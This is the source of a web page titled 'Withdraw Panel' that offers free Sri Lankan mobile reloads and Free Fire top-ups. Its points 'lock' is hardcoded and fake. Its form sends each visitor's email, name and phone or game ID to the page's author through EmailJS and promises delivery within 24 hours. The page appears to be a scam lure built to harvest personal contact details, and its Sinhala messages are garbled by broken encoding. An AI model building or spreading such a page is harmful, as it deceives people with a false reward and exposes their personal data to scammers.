<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Withdraw Panel</title>
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: Arial;
      text-align: center;
      padding: 20px;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 20px;
    }

    .button {
      padding: 10px 20px;
      background: limegreen;
      color: #000;
      font-weight: bold;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .card-buttons {
      margin-top: 20px;
    }

    .card-button {
      border: 2px solid limegreen;
      background: #000;
      color: limegreen;
      padding: 10px 20px;
      border-radius: 10px;
      margin: 5px;
      cursor: pointer;
      position: relative;
    }

    .card-button img {
      width: 24px;
      height: 24px;
      vertical-align: middle;
      margin-right: 5px;
    }

    .locked {
      opacity: 0.5;
      pointer-events: auto;
    }

    .locked::after {
      content: "üîí";
      font-size: 24px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: red;
    }

    #formContainer {
      display: none;
      margin-top: 30px;
      padding: 20px;
      border: 2px solid #0f0;
      border-radius: 10px;
      background-color: #111;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px auto;
      display: block;
      border-radius: 5px;
      border: none;
    }

    #cardImage {
      width: 100px;
      border-radius: 10px;
      margin: 10px auto;
    }

    #submitBtn {
      background: limegreen;
      color: #000;
      font-weight: bold;
    }

    small {
      display: block;
      margin-top: 20px;
      color: #888;
    }
  </style>
</head>
<body>

<h1>Withdraw Panel</h1>
<button class="button" onclick="showCardOptions()">Get Withdraw</button>

<div class="card-buttons" id="cardOptions" style="display:none;">
  <button class="card-button" data-type="Dialog" onclick="selectCard('Dialog')">
    <img src="https://i.postimg.cc/9FQhFcQS/dialog-logo-png-seeklogo-203576.png"> Dialog Card
  </button>
  <button class="card-button" data-type="Hutch" onclick="selectCard('Hutch')">
    <img src="https://i.postimg.cc/gcDpWxm8/hutch-logo-png-seeklogo-323552.png"> Hutch Card
  </button>
  <button class="card-button" data-type="Mobitel" onclick="selectCard('Mobitel')">
    <img src="https://i.postimg.cc/ncP4pRf9/sltmobitel-logo-png-seeklogo-433080.png"> Mobitel Card
  </button>
  <button class="card-button" data-type="FF" onclick="selectCard('FF')">
    <img src="https://i.imgur.com/VXzG2uk.png"> FF ID Top-up
  </button>
  <button class="card-button" data-type="TV" onclick="selectCard('TV')">
    <img src="https://i.imgur.com/VXzG2uk.png"> Dialog TV Reload
  </button>
</div>

<div id="formContainer">
  <h2 id="formTitle"></h2>
  <img id="cardImage" src="" alt="Card Image">
  <form id="withdrawForm">
    <input type="text" id="name" placeholder="Your Active Email" required>
    <input type="text" id="number" placeholder="Your Name" required>
    <input type="text" id="message" placeholder="Your Number / Reload Number" required>
    <input type="text" id="time" readonly>
    <input type="submit" id="submitBtn" value="Submit">
  </form>
  <small>2025 - Made by King Mafia | KING MS</small>
</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  emailjs.init("JxcwLhzOOhD35rRUH");

  const form = document.getElementById("withdrawForm");
  const formContainer = document.getElementById("formContainer");
  const cardImage = document.getElementById("cardImage");
  const formTitle = document.getElementById("formTitle");

  const imageMap = {
    "Dialog": "https://i.postimg.cc/9FQhFcQS/dialog-logo-png-seeklogo-203576.png",
    "Hutch": "https://i.postimg.cc/gcDpWxm8/hutch-logo-png-seeklogo-323552.png",
    "Mobitel": "https://i.postimg.cc/ncP4pRf9/sltmobitel-logo-png-seeklogo-433080.png",
    "FF": "https://i.imgur.com/VXzG2uk.png",
    "TV": "https://i.imgur.com/VXzG2uk.png"
  };

  // üîê Lock system
  let userPoints = 8;

  const lockedCards = {
    Dialog: 10,
    Hutch: 5,
    Mobitel: 20
  };

  window.addEventListener("DOMContentLoaded", () => {
    for (const [type, requiredPoints] of Object.entries(lockedCards)) {
      const button = document.querySelector(`.card-button[data-type="${type}"]`);
      if (button) {
        button.classList.add("locked");
        button.addEventListener("click", (e) => {
          e.preventDefault();
          alert(`üîí ${type} unlock ‡∂ö‡∂ª‡∂±‡∑ä‡∂± points ${requiredPoints}‡∂ö‡∑ä ‡∂ï‡∂±. ‡∂î‡∂∂‡∂ß ‡∂≠‡∑í‡∂∫‡∑ô‡∂±‡∑ä‡∂±‡∑ö ${userPoints}‡∂ö‡∑ä`);
        });
      }
    }
  });

  function showCardOptions() {
    document.getElementById("cardOptions").style.display = "block";
  }

  function selectCard(type) {
    // lock check
    if (lockedCards[type] && userPoints < lockedCards[type]) {
      alert(`üîí ${type} unlock ‡∂ö‡∂ª‡∂±‡∑ä‡∂± points ${lockedCards[type]}‡∂ö‡∑ä ‡∂ï‡∂±. ‡∂î‡∂∂‡∂ß ‡∂≠‡∑í‡∂∫‡∑ô‡∂±‡∑ä‡∂±‡∑ö ${userPoints}‡∂ö‡∑ä`);
      return;
    }

    formContainer.style.display = "block";

    const now = new Date().toLocaleString();
    document.getElementById("time").value = now;

    formTitle.innerText = type + " Reload";
    cardImage.src = imageMap[type];

    const messageInput = document.getElementById("message");
    if (type === "FF") {
      messageInput.placeholder = "Enter your Free Fire ID";
    } else if (type === "TV") {
      messageInput.placeholder = "Enter your Dialog TV Number";
    } else {
      messageInput.placeholder = "Enter your Phone Number";
    }
  }

  form.addEventListener("submit", function (e) {
    e.preventDefault();
    alert("‡∂∏‡∑ú‡∑Ñ‡∑ú‡∂≠‡∂ö‡∑ä ‡∂ª‡∑ê‡∂Ø‡∑í ‡∑É‡∑í‡∂ß‡∑í‡∂±‡∑ä‡∂±...");

    const data = {
      name: document.getElementById("name").value,
      number: document.getElementById("number").value,
      message: document.getElementById("message").value,
      time: document.getElementById("time").value,
      title: formTitle.innerText,
    };

    emailjs.send("service_2wht3tb", "template_jrstb44", data)
      .then(() => {
        alert("‚úÖ Withdraw request sent successfully!");
        alert("‡∂¥‡∑ê‡∂∫ 24‡∂ö‡∑ä ‡∂∫‡∑è‡∂∏‡∂ß ‡∂¥‡∑ô‡∂ª ‡∂î‡∂∂‡∑ô ‡∂∫‡∑í‡∂Ω‡∑ä‡∂Ω‡∑í‡∂∏ ‡∂∫‡∑í‡∂ß‡∑î ‡∑Ä‡∑ô‡∑Ä‡∑í!");
        form.reset();
        formContainer.style.display = "none";
      })
      .catch((err) => {
        console.error("‚ùå Error:", err);
        alert("‚ùå Something went wrong!");
      });
  });
</script>
</body>
</html>
